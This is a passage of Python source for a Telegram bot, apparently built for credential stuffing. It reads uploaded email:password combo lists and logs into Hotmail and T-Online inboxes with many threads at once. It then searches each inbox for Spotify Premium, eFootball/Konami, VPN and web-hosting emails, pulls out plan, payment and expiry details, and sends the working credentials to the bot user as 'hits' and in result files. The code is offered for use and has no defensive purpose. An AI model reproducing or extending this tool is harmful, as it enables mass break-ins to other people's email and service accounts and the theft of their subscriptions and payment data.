                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id)
            )
            hits = []; bads = []; no_inbox = []; errors_list = []
            checked = [0]; lock = threading.Lock()
            _sp_chat = message.chat.id; _sp_pm = progress_msg.message_id
            _sp_uname = message.from_user.username or ""

            _SPOTIFY_SENDERS = ["no-reply@spotify.com", "noreply@spotify.com"]
            _PREMIUM_KEYWORDS = ["premium", "individual", "family", "duo", "student", "unlimited"]
            _PLAN_MAP = {
                "family": "Family Plan", "duo": "Duo Plan",
                "student": "Student Premium", "individual": "Individual Premium",
                "unlimited": "Unlimited", "premium": "Premium",
            }

            def _sp_detect_plan(body_lower):
                for key, label in _PLAN_MAP.items():
                    if key in body_lower:
                        return label
                return "Premium"

            def _sp_check_one(combo):
                _ea, _pw = combo
                if not active_scans.get(user_id, False):
                    return
                try:
                    result, provider = check_account_auto(_ea, _pw)
                    if result.get("status") == "RETRY":
                        result, provider = check_account_auto(_ea, _pw)
                    status = result.get("status", "RETRY")
                    if status == "BAD":
                        with lock:
                            checked[0] += 1
                            bads.append(f"{_ea}:{_pw}")
                        return
                    if status != "HIT":
                        with lock:
                            checked[0] += 1
                            errors_list.append(f"{_ea}:{_pw} | {status}")
                        return
                    found_premium = False
                    plan_info = "Premium"
                    if provider == "tonline":
                        for _sender in _SPOTIFY_SENDERS:
                            _found, _fetched = TOnlineChecker.search_and_fetch(_ea, _pw, _sender, max_count=10)
                            if _found and _fetched:
                                for _body in _fetched:
                                    _bl = _body.lower()
                                    if any(kw in _bl for kw in _PREMIUM_KEYWORDS):
                                        found_premium = True
                                        plan_info = _sp_detect_plan(_bl)
                                        break
                            if found_premium:
                                break
                    else:
                        _token = result.get("token", "")
                        _cid   = result.get("cid", "")
                        for _query in ['from:"no-reply@spotify.com"', 'from:"noreply@spotify.com"']:
                            _texts = _hotmail_search_and_fetch(_token, _cid, _query, 10)
                            if _texts:
                                for _body in _texts:
                                    _bl = _body.lower()
                                    if any(kw in _bl for kw in _PREMIUM_KEYWORDS):
                                        found_premium = True
                                        plan_info = _sp_detect_plan(_bl)
                                        break
                            if found_premium:
                                break
                    with lock:
                        checked[0] += 1
                        if found_premium:
                            hits.append(f"{_ea}:{_pw} | Spotify Premium ✅ | Plan: {plan_info}")
                            _hit_num = len(hits)
                            _is_grp = is_allowed_group(message.chat.id) and message.chat.id != user_id
                            _tgt = user_id if _is_grp else message.chat.id
                            try:
                                bot.send_message(_tgt,
                                    f"━━━━━━━━━━━━━━━━━━━━\n"
                                    f"🎵 <b>Spotify Premium Hit #{_hit_num}</b>\n"
                                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                                    f"📧 Email: <code>{_ea}</code>\n"
                                    f"🔑 Pass: <code>{_pw}</code>\n"
                                    f"💎 Plan: <b>{plan_info}</b>\n\n"
                                    f"━━━━━━━━━━━━━━━━━━━━\n"
                                    f"💎 {MY_SIGNATURE}", parse_mode='HTML')
                            except: pass
                        else:
                            no_inbox.append(f"{_ea}:{_pw} | No Premium Found")
                except Exception:
                    with lock:
                        checked[0] += 1
                        errors_list.append(f"{_ea}:{_pw} | ERROR")

            def _sp_progress():
                _last = -1
                while checked[0] < total and active_scans.get(user_id, False):
                    if checked[0] != _last:
                        _last = checked[0]
                        try:
                            bot.edit_message_text(
                                f"🎵 <b>Spotify Premium Inbox Running...</b>\n\n"
                                f"📊 Progress: <b>{checked[0]}/{total}</b>\n"
                                f"💎 Premium Hits: <b>{len(hits)}</b> | ❌ Bad: <b>{len(bads)}</b> | 📭 No Premium: <b>{len(no_inbox)}</b>",
                                _sp_chat, _sp_pm,
                                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id))
                        except: pass

            def _sp_premium_thread():
              try:
                threading.Thread(target=_sp_progress, daemon=True).start()
                with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
                    ex.map(_sp_check_one, combos)
                end_scan(user_id)
                try: bot.delete_message(_sp_chat, _sp_pm)
                except: pass
                cc = checked[0]
                record_inbox(user_id, username=_sp_uname, service_name="Spotify Premium", combos_count=cc, hits=len(hits), bads=len(bads))
                _grp = is_allowed_group(_sp_chat) and _sp_chat != user_id
                bot.send_message(_sp_chat,
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"🎵 <b>SPOTIFY PREMIUM {'⏹ STOPPED' if cc < total else 'COMPLETED'}</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 <b>Checked:</b> {cc}/{total}\n"
                    f"💎 <b>Premium Hits:</b> {len(hits)}\n"
                    f"📭 <b>No Premium:</b> {len(no_inbox)}\n"
                    f"❌ <b>Bad Login:</b> {len(bads)}\n"
                    f"🔄 <b>Errors:</b> {len(errors_list)}\n\n"
                    f"{'📩 <i>Hits sent to your DM!</i>' + chr(10) + chr(10) if _grp and hits else ''}"
                    f"━━━━━━━━━━━━━━━━━━━━\n💎 {MY_SIGNATURE}", parse_mode='HTML')
                _al = []
                if hits:        _al += ["═══ SPOTIFY PREMIUM HITS ═══"] + hits
                if no_inbox:    _al += ["\n═══ NO PREMIUM (login ok) ═══"] + no_inbox
                if bads:        _al += ["\n═══ BAD ═══"] + bads
                if errors_list: _al += ["\n═══ ERRORS ═══"] + errors_list
                if _al:
                    _tgt2 = user_id if _grp else _sp_chat
                    send_large_document(_tgt2, "\n".join(_al).encode('utf-8'),
                        f"SPOTIFY_PREMIUM_{len(hits)}hits_{len(bads)}bad_{total}total.txt",
                        caption=f"🎵 <b>Spotify Premium Results</b>\n💎 {len(hits)} Premium | ❌ {len(bads)} Bad\n\n💎 {MY_SIGNATURE}")
              except Exception as e:
                try: bot.send_message(_sp_chat, f"❌ Error: {str(e)}")
                except: pass
              finally:
                user_sessions.pop(user_id, None)
                end_scan(user_id)

            threading.Thread(target=_sp_premium_thread, daemon=True).start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        return

    # ── eFOOTBALL INBOX MODE ──────────────────────────────────────
    # HIT = valid login (email:pass works). Bonus: show Konami emails found.
    if doc_session.get("mode") == "inbox_efootball" and doc_session.get("step") == "waiting_combo":
        try:
            downloaded_file = _download_combo(message)
            if downloaded_file is None:
                return
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()
            combos = []
            for _ln in raw_lines:
                _ln = _ln.strip()
                if not _ln or ':' not in _ln:
                    continue
                _sp = _ln.split(':', 1)
                _ea, _pw = _sp[0].strip(), _sp[1].strip()
                if _pw and '@' in _ea and '.' in _ea.split('@')[-1]:
                    combos.append((_ea, _pw))
            total = len(combos)
            if total == 0:
                bot.send_message(message.chat.id, "❌ No valid lines found.")
                user_sessions.pop(user_id, None)
                return
            if not start_scan(user_id):
                bot.send_message(message.chat.id, "⚠️ You already have an active scan running!", parse_mode='HTML')
                return
            progress_msg = bot.send_message(
                message.chat.id,
                f"⚽ <b>eFOOTBALL Inbox Checker Started!</b>\n\n"
                f"📬 Senders: <code>noreply@konami.net</code>\n"
                f"📥 Accounts: <b>{total}</b>\n\n"
                f"✅ HIT = valid email &amp; password\n"
                f"🎮 Bonus: Konami inbox emails shown if found\n\n⏳ Please wait...",
                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id)
            )
            hits = []; bads = []; errors_list = []; skipped = []
            checked = [0]; lock = threading.Lock()
            _ef_chat = message.chat.id; _ef_pm = progress_msg.message_id
            _ef_uname = message.from_user.username or ""

            _KONAMI_SENDERS = ["noreply@konami.net", "no-reply@konami.net", "support@konami.net"]
            _KONAMI_QUERIES  = ['from:"noreply@konami.net"', 'from:"no-reply@konami.net"', 'from:"support@konami.net"']

            def _ef_extract_info(body):
                info = []
                # Try to find GP / Game Points
                gp = re.search(r'(\d[\d,\.]+)\s*(?:GP|Game Points?)', body, re.IGNORECASE)
                if gp:
                    info.append(f"💰 GP: {gp.group(1)}")
                # myKONAMI ID
                kid = re.search(r'myKONAMI\s*ID[:\s]*([A-Z0-9\-]{6,20})', body, re.IGNORECASE)
                if kid:
                    info.append(f"🆔 myKONAMI ID: {kid.group(1)}")
                # Subject type detection
                body_l = body.lower()
                if 'password' in body_l or 'reset' in body_l:
                    info.append("🔑 Password Reset Email")
                elif 'purchase' in body_l or 'payment' in body_l or 'order' in body_l:
                    info.append("🛒 Purchase Found")
                elif 'welcome' in body_l or 'register' in body_l or 'sign up' in body_l:
                    info.append("📝 Registration Email")
                elif 'mykonami' in body_l or 'efootball' in body_l or 'konami' in body_l:
                    info.append("🎮 Konami Activity")
                return " | ".join(info) if info else "🎮 Konami Email Found"

            # Providers that don't support plain IMAP login → skip instead of BAD
            _EF_SKIP_DOMAINS = {
                "gmail.com", "googlemail.com", "google.com",
                "yahoo.com", "yahoo.co.uk", "yahoo.de", "yahoo.fr", "yahoo.es",
                "yahoo.it", "yahoo.co.jp", "yahoo.com.br", "yahoo.com.au",
                "ymail.com", "rocketmail.com",
                "icloud.com", "me.com", "mac.com",
                "protonmail.com", "pm.me", "proton.me",
                "aol.com", "aim.com",
            }

            def _ef_check_one(combo):
                _ea, _pw = combo
                if not active_scans.get(user_id, False):
                    return
                _domain = _ea.lower().split("@")[-1] if "@" in _ea else ""
                if _domain in _EF_SKIP_DOMAINS:
                    with lock:
                        checked[0] += 1
                        skipped.append(f"{_ea}:{_pw} | {_domain} (plain IMAP not supported)")
                    return
                try:
                    result, provider = check_account_auto(_ea, _pw)
                    if result.get("status") == "RETRY":
                        result, provider = check_account_auto(_ea, _pw)
                    status = result.get("status", "RETRY")
                    if status == "BAD":
                        with lock:
                            checked[0] += 1
                            bads.append(f"{_ea}:{_pw}")
                        return
                    if status != "HIT":
                        with lock:
                            checked[0] += 1
                            errors_list.append(f"{_ea}:{_pw} | {status}")
                        return
                    # LOGIN SUCCEEDED → always a hit
                    konami_info = "❌ No Konami Emails Found"
                    mail_count = 0
                    if provider == "tonline":
                        for _sender in _KONAMI_SENDERS:
                            _found, _fetched = TOnlineChecker.search_and_fetch(_ea, _pw, _sender, max_count=5)
                            if _found and _fetched:
                                mail_count += len(_fetched)
                                for _msg in _fetched[:1]:
                                    _body = _msg.get("body", "") if isinstance(_msg, dict) else str(_msg)
                                    konami_info = _ef_extract_info(_body)
                                break
                    else:
                        _token = result.get("token", "")
                        _cid   = result.get("cid", "")
                        for _query in _KONAMI_QUERIES:
                            _texts = _hotmail_search_and_fetch(_token, _cid, _query, 5)
                            if _texts:
                                mail_count += len(_texts)
                                _body0 = _texts[0].get("body", "") if isinstance(_texts[0], dict) else str(_texts[0])
                                konami_info = _ef_extract_info(_body0)
                                break
                    mail_tag = f"📩 {mail_count} Konami Email(s)" if mail_count > 0 else "📭 No Konami Emails"
                    hit_line = f"{_ea}:{_pw} | {mail_tag} | {konami_info}"
                    with lock:
                        checked[0] += 1
                        hits.append(hit_line)
                        _hit_num = len(hits)
                        _is_grp = is_allowed_group(message.chat.id) and message.chat.id != user_id
                        _tgt = user_id if _is_grp else message.chat.id
                    try:
                        bot.send_message(_tgt,
                            f"━━━━━━━━━━━━━━━━━━━━\n"
                            f"⚽ <b>eFootball Hit #{_hit_num}</b>\n"
                            f"━━━━━━━━━━━━━━━━━━━━\n\n"
                            f"📧 Email: <code>{_ea}</code>\n"
                            f"🔑 Pass: <code>{_pw}</code>\n"
                            f"{mail_tag}\n"
                            f"📋 Info: {konami_info}\n\n"
                            f"━━━━━━━━━━━━━━━━━━━━\n"
                            f"💎 {MY_SIGNATURE}", parse_mode='HTML')
                    except Exception:
                        pass
                except Exception:
                    with lock:
                        checked[0] += 1
                        errors_list.append(f"{_ea}:{_pw} | ERROR")

            def _ef_progress():
                _last = -1
                while checked[0] < total and active_scans.get(user_id, False):
                    if checked[0] != _last:
                        _last = checked[0]
                        try:
                            bot.edit_message_text(
                                f"⚽ <b>eFOOTBALL Inbox Running...</b>\n\n"
                                f"📊 Progress: <b>{checked[0]}/{total}</b>\n"
                                f"✅ Hits: <b>{len(hits)}</b> | ❌ Bad: <b>{len(bads)}</b>\n"
                                f"⏭ Skipped: <b>{len(skipped)}</b> | ⚠️ Errors: <b>{len(errors_list)}</b>",
                                _ef_chat, _ef_pm,
                                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id))
                        except Exception:
                            pass
                    time.sleep(2)

            def _ef_thread():
                try:
                    threading.Thread(target=_ef_progress, daemon=True).start()
                    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
                        ex.map(_ef_check_one, combos)
                    end_scan(user_id)
                    try:
                        bot.delete_message(_ef_chat, _ef_pm)
                    except Exception:
                        pass
                    cc = checked[0]
                    record_inbox(user_id, username=_ef_uname, service_name="eFootball", combos_count=cc, hits=len(hits), bads=len(bads))
                    _grp = is_allowed_group(_ef_chat) and _ef_chat != user_id
                    bot.send_message(_ef_chat,
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"⚽ <b>eFOOTBALL {'⏹ STOPPED' if cc < total else 'COMPLETED'}</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📊 <b>Checked:</b> {cc}/{total}\n"
                        f"✅ <b>Hits (valid login):</b> {len(hits)}\n"
                        f"❌ <b>Bad Login:</b> {len(bads)}\n"
                        f"⏭ <b>Skipped (Gmail/Yahoo/etc):</b> {len(skipped)}\n"
                        f"⚠️ <b>Errors:</b> {len(errors_list)}\n\n"
                        f"💡 <i>Skipped = Gmail/Yahoo/iCloud (can't check plain IMAP)</i>\n"
                        f"{'📩 <i>Hits sent to your DM!</i>' + chr(10) + chr(10) if _grp and hits else ''}"
                        f"━━━━━━━━━━━━━━━━━━━━\n💎 {MY_SIGNATURE}", parse_mode='HTML')
                    _al = []
                    if hits:        _al += ["═══ eFOOTBALL HITS (valid login) ═══"] + hits
                    if bads:        _al += ["\n═══ BAD ═══"] + bads
                    if skipped:     _al += ["\n═══ SKIPPED (unsupported provider) ═══"] + skipped
                    if errors_list: _al += ["\n═══ ERRORS ═══"] + errors_list
                    if _al:
                        _tgt2 = user_id if _grp else _ef_chat
                        send_large_document(_tgt2, "\n".join(_al).encode('utf-8'),
                            f"EFOOTBALL_{len(hits)}hits_{len(bads)}bad_{total}total.txt",
                            caption=f"⚽ <b>eFootball Results</b>\n✅ {len(hits)} Hits | ❌ {len(bads)} Bad | ⏭ {len(skipped)} Skipped\n\n💎 {MY_SIGNATURE}")
                except Exception as e:
                    try:
                        bot.send_message(_ef_chat, f"❌ Error: {str(e)}")
                    except Exception:
                        pass
                finally:
                    user_sessions.pop(user_id, None)
                    end_scan(user_id)

            threading.Thread(target=_ef_thread, daemon=True).start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        return

    # ── VPN INBOXEN MODE ──────────────────────────────────────────
    if doc_session.get("mode") == "inbox_vpn" and doc_session.get("step") == "waiting_combo":
        try:
            downloaded_file = _download_combo(message)
            if downloaded_file is None:
                return
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()
            combos = []
            for _ln in raw_lines:
                _ln = _ln.strip()
                if not _ln or ':' not in _ln:
                    continue
                _sp = _ln.split(':', 1)
                _ea, _pw = _sp[0].strip(), _sp[1].strip()
                if _pw and '@' in _ea and '.' in _ea.split('@')[-1]:
                    combos.append((_ea, _pw))
            total = len(combos)
            if total == 0:
                bot.send_message(message.chat.id, "❌ No valid lines found.")
                user_sessions.pop(user_id, None)
                return
            if not start_scan(user_id):
                bot.send_message(message.chat.id, "⚠️ You already have an active scan running!", parse_mode='HTML')
                return
            progress_msg = bot.send_message(
                message.chat.id,
                f"🔒 <b>VPN Inbox Scan Started!</b>\\n\\n"
                f"📥 Accounts: <b>{total}</b>\\n\\n⏳ Please wait...",
                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id)
            )
            hits = []; bads = []; no_inbox = []; errors_list = []
            checked = [0]; lock = threading.Lock()

            _inbox_vpn_SENDERS = {'NordVPN': ['noreply@nordvpn.com', 'info@nordvpn.com', 'no-reply@nordvpn.com'], 'ExpressVPN': ['noreply@expressvpn.com', 'info@expressvpn.com', 'no-reply@expressvpn.com'], 'Surfshark': ['no-reply@surfshark.com', 'noreply@surfshark.com', 'billing@surfshark.com'], 'ProtonVPN': ['noreply@protonmail.com', 'noreply@proton.me', 'no-reply@proton.me'], 'Mullvad': ['noreply@mullvad.net', 'info@mullvad.net'], 'CyberGhost': ['noreply@cyberghostvpn.com', 'billing@cyberghostvpn.com'], 'IPVanish': ['noreply@ipvanish.com', 'billing@ipvanish.com'], 'PIA': ['noreply@privateinternetaccess.com', 'support@privateinternetaccess.com'], 'Windscribe': ['noreply@windscribe.com'], 'TunnelBear': ['hi@tunnelbear.com', 'noreply@tunnelbear.com'], 'PureVPN': ['noreply@purevpn.com', 'billing@purevpn.com'], 'VyprVPN': ['noreply@vyprvpn.com'], 'HMA': ['noreply@hidemyass.com'], 'Atlas VPN': ['noreply@atlasvpn.com'], 'Hotspot Shield': ['noreply@hotspotshield.com']}

            def _inbox_vpn_check_one(combo):
                _ea, _pw = combo
                if not active_scans.get(user_id, False):
                    return
                try:
                    result, provider = check_account_auto(_ea, _pw)
                    if result.get("status") == "RETRY":
                        result, provider = check_account_auto(_ea, _pw)
                    status = result.get("status", "RETRY")
                    if status == "BAD":
                        with lock:
                            checked[0] += 1
                            bads.append(f"{_ea}:{_pw}")
                        return
                    if status != "HIT":
                        with lock:
                            checked[0] += 1
                            errors_list.append(f"{_ea}:{_pw} | {status}")
                        return
                    _found = False; _prov_name = ""; _email_count = 0; _combined = ""; _payments = []
                    if provider == "tonline":
                        for _pn, _slist in _inbox_vpn_SENDERS.items():
                            for _s in _slist:
                                _sf, _fetched = TOnlineChecker.search_and_fetch(_ea, _pw, _s, max_count=10)
                                if _sf:
                                    _found = True; _email_count += len(_fetched)
                                    if not _prov_name: _prov_name = _pn
                                    for _it in _fetched: _combined += " " + _it.get("subject","") + " " + _it.get("body","")
                    else:
                        _tk2 = result.get("token",""); _cid2 = result.get("cid","")
                        for _pn, _slist in _inbox_vpn_SENDERS.items():
                            for _s in _slist:
                                _texts2 = _hotmail_search_and_fetch(_tk2, _cid2, f'from:"{_s}"', 10)
                                if _texts2:
                                    _found = True; _email_count += len(_texts2)
                                    if not _prov_name: _prov_name = _pn
                                    for _it in _texts2: _combined += " " + _it.get("subject","") + " " + _it.get("body","")
                    if _found and _combined:
                        _payments = extract_payment_from_text(_combined.lower())

                    with lock:
                        checked[0] += 1
                        if _found:
                            _pay_str = " | ".join(_payments) if _payments else "None"
                            _exp = _extract_expiry_date(_combined) if _combined else None
                            _exp_line = f"📅 Expires: <b>{_exp}</b>\\n" if _exp else ""
                            hits.append(f"{_ea}:{_pw} | VPN ✅ | {_prov_name} | Emails: {_email_count} | Payment: {_pay_str}")
                            _hnum = len(hits)
                            _is_grp = is_allowed_group(message.chat.id) and message.chat.id != user_id
                            _tgt = user_id if _is_grp else message.chat.id
                            try:
                                bot.send_message(_tgt,
                                    f"━━━━━━━━━━━━━━━━━━━━\\n"
                                    f"🔒 <b>VPN Hit #{_hnum}</b>\\n"
                                    f"━━━━━━━━━━━━━━━━━━━━\\n\\n"
                                    f"📧 Email: <code>{_ea}</code>\\n"
                                    f"👤 Pass: <code>{_pw}</code>\\n\\n"
                                    f"🔒 <b>Provider:</b> {_prov_name}\\n"
                                    f"📨 <b>Emails found:</b> {_email_count}\\n"
                                    f"{_exp_line}"
                                    f"💳 <b>Payment:</b> {_pay_str}\\n\\n"
                                    f"━━━━━━━━━━━━━━━━━━━━\\n"
                                    f"💎 {MY_SIGNATURE}", parse_mode='HTML')
                            except Exception: pass
                        else:
                            no_inbox.append(f"{_ea}:{_pw}")
                except Exception:
                    with lock:
                        checked[0] += 1
                        errors_list.append(f"{_ea}:{_pw} | ERROR")

            def _inbox_vpn_progress():
                _last = -1
                while checked[0] < total and active_scans.get(user_id, False):
                    if checked[0] != _last:
                        _last = checked[0]
                        try:
                            bot.edit_message_text(
                                f"🔒 <b>VPN Check Running...</b>\\n\\n"
                                f"📊 Progress: <b>{checked[0]}/{total}</b>\\n"
                                f"✅ Hits: <b>{len(hits)}</b> | ❌ Bad: <b>{len(bads)}</b> | 📭 No Match: <b>{len(no_inbox)}</b>",
                                message.chat.id, progress_msg.message_id,
                                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id))
                        except: pass
        
            _inbox_vpn_chat = message.chat.id; _inbox_vpn_pm = progress_msg.message_id; _inbox_vpn_uname = message.from_user.username or ""

            def _inbox_vpn_thread():
              try:
                threading.Thread(target=_inbox_vpn_progress, daemon=True).start()
                with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
                    ex.map(_inbox_vpn_check_one, combos)
                end_scan(user_id)
                try: bot.delete_message(_inbox_vpn_chat, _inbox_vpn_pm)
                except: pass
                cc = checked[0]
                record_inbox(user_id, username=_inbox_vpn_uname, service_name="VPN", combos_count=cc, hits=len(hits), bads=len(bads))
                _grp = is_allowed_group(_inbox_vpn_chat) and _inbox_vpn_chat != user_id
                bot.send_message(_inbox_vpn_chat,
                    f"━━━━━━━━━━━━━━━━━━━━\\n"
                    f"🔒 <b>VPN SCAN {'⏹ STOPPED' if cc < total else 'COMPLETED'}</b>\\n"
                    f"━━━━━━━━━━━━━━━━━━━━\\n\\n"
                    f"📊 <b>Checked:</b> {cc}/{total}\\n"
                    f"✅ <b>Found:</b> {len(hits)}\\n"
                    f"📭 <b>Login OK, no match:</b> {len(no_inbox)}\\n"
                    f"❌ <b>Bad:</b> {len(bads)}\\n"
                    f"🔄 <b>Errors:</b> {len(errors_list)}\\n\\n"
                    f"{'📩 <i>Hits sent to your DM!</i>' + chr(10) + chr(10) if _grp and hits else ''}"
                    f"━━━━━━━━━━━━━━━━━━━━\\n💎 {MY_SIGNATURE}", parse_mode='HTML')
                _al = []
                if hits:        _al += ["═══ VPN HITS ═══"] + hits
                if no_inbox:    _al += ["\\n═══ LOGIN OK / NO MATCH ═══"] + no_inbox
                if bads:        _al += ["\\n═══ BAD ═══"] + bads
                if errors_list: _al += ["\\n═══ ERRORS ═══"] + errors_list
                if _al:
                    _tgt2 = user_id if _grp else _inbox_vpn_chat
                    send_large_document(_tgt2, "\\n".join(_al).encode('utf-8'),
                        f"VPN_{len(hits)}hits_{len(bads)}bad_{total}total.txt",
                        caption=f"🔒 <b>VPN Results</b>\\n✅ {len(hits)} Hits | ❌ {len(bads)} Bad\\n\\n💎 {MY_SIGNATURE}")
              except Exception as e:
                try: bot.send_message(_inbox_vpn_chat, f"❌ Error: {str(e)}")
                except: pass
              finally:
                user_sessions.pop(user_id, None)
                end_scan(user_id)

            threading.Thread(target=_inbox_vpn_thread, daemon=True).start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        return

    # ── HOSTING INBOXEN MODE ──────────────────────────────────────────
    if doc_session.get("mode") == "inbox_hosting" and doc_session.get("step") == "waiting_combo":
        try:
            downloaded_file = _download_combo(message)
            if downloaded_file is None:
                return
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()
            combos = []
            for _ln in raw_lines:
                _ln = _ln.strip()
                if not _ln or ':' not in _ln:
                    continue
                _sp = _ln.split(':', 1)
                _ea, _pw = _sp[0].strip(), _sp[1].strip()
                if _pw and '@' in _ea and '.' in _ea.split('@')[-1]:
                    combos.append((_ea, _pw))
            total = len(combos)
            if total == 0:
                bot.send_message(message.chat.id, "❌ No valid lines found.")
                user_sessions.pop(user_id, None)
                return
            if not start_scan(user_id):
                bot.send_message(message.chat.id, "⚠️ You already have an active scan running!", parse_mode='HTML')
                return
            progress_msg = bot.send_message(
                message.chat.id,
                f"🌐 <b>Hosting Inbox Scan Started!</b>\\n\\n"
                f"📥 Accounts: <b>{total}</b>\\n\\n⏳ Please wait...",
                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id)
            )
            hits = []; bads = []; no_inbox = []; errors_list = []
            checked = [0]; lock = threading.Lock()

            _inbox_hosting_SENDERS = {'GoDaddy': ['noreply@godaddy.com', 'donotreply@godaddy.com', 'subscriptions@godaddy.com'], 'Bluehost': ['noreply@bluehost.com', 'billing@bluehost.com'], 'HostGator': ['support@hostgator.com', 'billing@hostgator.com'], 'SiteGround': ['noreply@siteground.com', 'info@siteground.com'], 'DreamHost': ['support@dreamhost.com', 'no-reply@dreamhost.com'], 'Namecheap': ['noreply@namecheap.com', 'support@namecheap.com'], 'Ionos': ['noreply@ionos.com', 'donotreply@ionos.com', 'noreply@1and1.com'], 'Hetzner': ['info@hetzner.com', 'robot@hetzner.com'], 'OVH': ['noreply@ovhcloud.com', 'noreply@ovh.com'], 'Cloudflare': ['noreply@cloudflare.com'], 'DigitalOcean': ['noreply@digitalocean.com', 'billing@digitalocean.com'], 'Vultr': ['noreply@vultr.com', 'billing@vultr.com'], 'Linode': ['noreply@linode.com', 'support@linode.com'], 'cPanel': ['noreply@cpanel.net']}

            def _inbox_hosting_check_one(combo):
                _ea, _pw = combo
                if not active_scans.get(user_id, False):
                    return
                try:
                    result, provider = check_account_auto(_ea, _pw)
                    if result.get("status") == "RETRY":
                        result, provider = check_account_auto(_ea, _pw)
                    status = result.get("status", "RETRY")
                    if status == "BAD":
                        with lock:
                            checked[0] += 1
                            bads.append(f"{_ea}:{_pw}")
                        return
                    if status != "HIT":
                        with lock:
                            checked[0] += 1
                            errors_list.append(f"{_ea}:{_pw} | {status}")
                        return
                    _found = False; _prov_name = ""; _email_count = 0; _combined = ""; _payments = []
                    if provider == "tonline":
                        for _pn, _slist in _inbox_hosting_SENDERS.items():
                            for _s in _slist:
                                _sf, _fetched = TOnlineChecker.search_and_fetch(_ea, _pw, _s, max_count=10)
                                if _sf:
                                    _found = True; _email_count += len(_fetched)
                                    if not _prov_name: _prov_name = _pn
                                    for _it in _fetched: _combined += " " + _it.get("subject","") + " " + _it.get("body","")
                    else:
                        _tk2 = result.get("token",""); _cid2 = result.get("cid","")
                        for _pn, _slist in _inbox_hosting_SENDERS.items():
                            for _s in _slist:
                                _texts2 = _hotmail_search_and_fetch(_tk2, _cid2, f'from:"{_s}"', 10)
                                if _texts2:
                                    _found = True; _email_count += len(_texts2)
                                    if not _prov_name: _prov_name = _pn
                                    for _it in _texts2: _combined += " " + _it.get("subject","") + " " + _it.get("body","")
                    if _found and _combined:
                        _payments = extract_payment_from_text(_combined.lower())

                    with lock:
                        checked[0] += 1
                        if _found:
                            _pay_str = " | ".join(_payments) if _payments else "None"
                            _exp = _extract_expiry_date(_combined) if _combined else None
                            _exp_line = f"📅 Expires: <b>{_exp}</b>\\n" if _exp else ""
                            hits.append(f"{_ea}:{_pw} | Hosting ✅ | {_prov_name} | Emails: {_email_count} | Payment: {_pay_str}")
                            _hnum = len(hits)
                            _is_grp = is_allowed_group(message.chat.id) and message.chat.id != user_id
                            _tgt = user_id if _is_grp else message.chat.id
                            try:
                                bot.send_message(_tgt,
                                    f"━━━━━━━━━━━━━━━━━━━━\\n"
                                    f"🌐 <b>Hosting Hit #{_hnum}</b>\\n"
                                    f"━━━━━━━━━━━━━━━━━━━━\\n\\n"
                                    f"📧 Email: <code>{_ea}</code>\\n"
                                    f"👤 Pass: <code>{_pw}</code>\\n\\n"
                                    f"🌐 <b>Provider:</b> {_prov_name}\\n"
                                    f"📨 <b>Emails found:</b> {_email_count}\\n"
                                    f"{_exp_line}"
                                    f"💳 <b>Payment:</b> {_pay_str}\\n\\n"
                                    f"━━━━━━━━━━━━━━━━━━━━\\n"
                                    f"💎 {MY_SIGNATURE}", parse_mode='HTML')
                            except Exception: pass
                        else:
                            no_inbox.append(f"{_ea}:{_pw}")
                except Exception:
                    with lock:
                        checked[0] += 1
                        errors_list.append(f"{_ea}:{_pw} | ERROR")

            def _inbox_hosting_progress():
                _last = -1
                while checked[0] < total and active_scans.get(user_id, False):
                    if checked[0] != _last:
                        _last = checked[0]
                        try:
                            bot.edit_message_text(
                                f"🌐 <b>Hosting Check Running...</b>\\n\\n"
                                f"📊 Progress: <b>{checked[0]}/{total}</b>\\n"
                                f"✅ Hits: <b>{len(hits)}</b> | ❌ Bad: <b>{len(bads)}</b> | 📭 No Match: <b>{len(no_inbox)}</b>",
                                message.chat.id, progress_msg.message_id,
                                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id))
                        except: pass
        
            _inbox_hosting_chat = message.chat.id; _inbox_hosting_pm = progress_msg.message_id; _inbox_hosting_uname = message.from_user.username or ""

            def _inbox_hosting_thread():
              try:
                threading.Thread(target=_inbox_hosting_progress, daemon=True).start()
                with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
                    ex.map(_inbox_hosting_check_one, combos)
                end_scan(user_id)
                try: bot.delete_message(_inbox_hosting_chat, _inbox_hosting_pm)
                except: pass
                cc = checked[0]
                record_inbox(user_id, username=_inbox_hosting_uname, service_name="Hosting", combos_count=cc, hits=len(hits), bads=len(bads))
                _grp = is_allowed_group(_inbox_hosting_chat) and _inbox_hosting_chat != user_id
                bot.send_message(_inbox_hosting_chat,
                    f"━━━━━━━━━━━━━━━━━━━━\\n"
                    f"🌐 <b>HOSTING SCAN {'⏹ STOPPED' if cc < total else 'COMPLETED'}</b>\\n"
                    f"━━━━━━━━━━━━━━━━━━━━\\n\\n"
                    f"📊 <b>Checked:</b> {cc}/{total}\\n"
                    f"✅ <b>Found:</b> {len(hits)}\\n"
                    f"📭 <b>Login OK, no match:</b> {len(no_inbox)}\\n"
                    f"❌ <b>Bad:</b> {len(bads)}\\n"
                    f"🔄 <b>Errors:</b> {len(errors_list)}\\n\\n"
                    f"{'📩 <i>Hits sent to your DM!</i>' + chr(10) + chr(10) if _grp and hits else ''}"
                    f"━━━━━━━━━━━━━━━━━━━━\\n💎 {MY_SIGNATURE}", parse_mode='HTML')
                _al = []
